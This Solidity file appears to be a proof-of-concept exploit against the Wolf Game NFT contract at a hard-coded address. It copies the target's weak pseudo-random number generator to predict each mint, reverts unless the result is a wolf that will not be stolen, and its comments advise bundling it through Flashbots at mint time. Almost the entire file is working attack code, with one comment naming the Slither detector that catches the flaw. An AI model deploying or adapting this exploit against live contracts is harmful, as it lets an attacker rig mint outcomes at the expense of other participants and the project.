// SPDX-License-Identifier: UNLICENSED

// It's trivially easy to exploit a weak PRNG based NFT.
// Just bundle this with a flashbots bundle where the mint occurs.
//
// It's also trivially easy to detect/prevent with a took like slither:
// https://github.com/crytic/slither/wiki/Detector-Documentation#weak-PRNG

pragma solidity ^0.8.0;

import "./WolfGame/Woolf.sol";

contract CatchTheWolf {
    address internal constant WOOLF_ADDRESS = 0xEB834ae72B30866af20a6ce5440Fa598BfAd3a42;

    Woolf private constant WGAME = Woolf(WOOLF_ADDRESS);

    constructor() payable {
    }

    receive() external payable {
    }

    fallback() external payable {
    }

    // A call we can revert on
    function roll_alpha() public {
        view_alpha();
    }

    // A view we can test with
    function view_alpha() public view {
        // We need to do it this way to account for theft and mixed ids.
        uint256 seed = WGAME.totalSupply() + 1;
        uint256 prn = random(seed);

        // We want to roll a wolf
        bool isSheep = (prn & 0xFFFF) % 10 != 0;
        require(!isSheep, 'Sheep');

        // Let's check that we'll own it.
        bool isOurs = ((prn >> 245) % 10) != 0;
        require(isOurs, "Stolen");

    }

    // The weak prng which started it all
    function random(uint256 seed) internal view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(
                tx.origin,
                blockhash(block.number - 1),
                block.timestamp,
                seed
            )));
    }
}
